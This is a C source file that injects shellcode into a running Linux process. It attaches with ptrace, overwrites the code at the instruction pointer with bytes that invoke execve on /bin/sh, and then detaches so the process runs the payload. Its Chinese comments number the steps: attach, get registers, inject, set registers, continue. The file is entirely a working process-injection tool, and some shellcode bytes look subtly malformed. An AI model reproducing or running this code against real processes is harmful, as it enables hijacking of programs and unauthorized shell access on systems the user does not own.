#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

#include <sys/stat.h>    
#include <fcntl.h>

uint8_t shellcode[] = {0x48,0x31,0xc0,0x48,0x89,0xc2,0x48,0x89,0xc6,0x48,0x8d,0x3d,0x04,0x00,0x00,0x00,0x04,0x3b,0x0f,0x05,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0xcc,0x90,0x90,0x90};


// 5. 目标进程继续运行
void continue_process(pid_t target_pid) {
	if ((ptrace(PTRACE_DETACH, target_pid, NULL, NULL)) < 0) {
		perror ("ptrace(DETACH):");
		exit (1);
	}
}


// 4. 恢复寄存器
void set_registers(pid_t target_pid, struct user_regs_struct *regs) {
	printf("+ Setting instruction pointer to %p\n", (void*)regs->rip);
	if ((ptrace(PTRACE_SETREGS, target_pid, NULL, regs)) < 0) {
		perror ("ptrace(GETREGS):");
		exit (1);
	}
	printf ("+ Run it!\n");
}

// 3. 内存信息
int inject_data (pid_t pid, uint8_t *src, void *dst, unsigned long len) {
	unsigned long i;
	uint64_t *s = (uint64_t *) src;
	uint64_t *d = (uint64_t *) dst;

	for (i = 0; i < len; i+=8, s++, d++) {
		if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0) {
			perror ("ptrace(POKETEXT):");
			return -1;
		}
	}
	puts("inject success!");
	return 0;
}

// 2. 获取寄存器
int get_registers(pid_t target_pid, struct user_regs_struct *regs)  {
	printf ("+ Getting Registers\n");
	if ((ptrace(PTRACE_GETREGS, target_pid, NULL, regs)) < 0) {
		perror ("ptrace(GETREGS):");
		exit(-1);
	}

	printf ("+ Injecting shell code at %p\n", (void *)(*regs).rip);
	unsigned long SHELLCODE_SIZE = sizeof(shellcode);
	inject_data(target_pid, shellcode, (void*)regs->rip, SHELLCODE_SIZE);
	(*regs).rip += 2;

	return 0;
}

// 1. 附加到正在运行的进程
int attach_process(pid_t target_pid) {
	printf("+ Tracing process %d\n", target_pid);
	if ((ptrace(PTRACE_ATTACH, target_pid, NULL, NULL)) < 0) {
		perror ("ptrace(ATTACH):");
		exit(-1);
	}
	printf("+ Waiting for process...\n");
	wait (NULL);

	return 0;
}

void get_shellcode() {

}

int main (int argc, char *argv[]) {
	if (argc < 2) {
		fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
		exit (1);
	}

	struct user_regs_struct regs;
	int                     syscall;
	long                    dst;
	pid_t target_pid = atoi (argv[1]);

	attach_process(target_pid);
	get_registers(target_pid, &regs);
	set_registers(target_pid, &regs);
	continue_process(target_pid);

	return 0;
}
